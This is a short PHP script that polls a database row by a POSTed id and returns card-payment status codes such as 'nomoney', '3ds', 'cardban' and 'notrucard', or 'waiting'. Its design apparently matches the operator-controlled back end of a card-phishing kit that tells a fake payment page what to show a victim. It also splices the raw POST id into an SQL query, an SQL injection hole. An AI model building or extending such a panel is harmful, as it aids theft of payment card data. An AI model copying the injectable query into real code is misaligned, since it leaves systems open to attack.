<?php
define("access", "yes");
require_once $_SERVER["DOCUMENT_ROOT"] .'/config.php';
require_once '../connection.php';

$id = $_POST['id'];
// $id = 6;
// echo "asdas";
$status = R::getAll( 'SELECT success,nomoney,limited,error,threeds,disablepay,cardban,notrucard FROM `path` WHERE `id` = '.$id.'')[0];
// print_r($status);

$row = R::load('path', $id);

if ($status['success']) {
	echo "success";
	$row->success = 0;
}
elseif ($status['nomoney']) {
	echo "nomoney";
	$row->nomoney = 0;
}
elseif ($status['limited']) {
	echo "limited";
	$row->limited = 0;
}
elseif ($status['error']) {
	echo "error";
	$row->error = 0;
}
elseif ($status['threeds']) {
	echo "3ds";
	$row->threeds = 0;
}
elseif ($status['disablepay']) {
	echo "disablepay";
	$row->disablepay = 0;
}
elseif ($status['cardban']) {
	echo "cardban";
	$row->cardban = 0;
}
elseif ($status['notrucard']) {
	echo "notrucard";
	$row->notrucard = 0;
}
else{
	echo "waiting";
}
R::store( $row );
// print_r(expression)
?>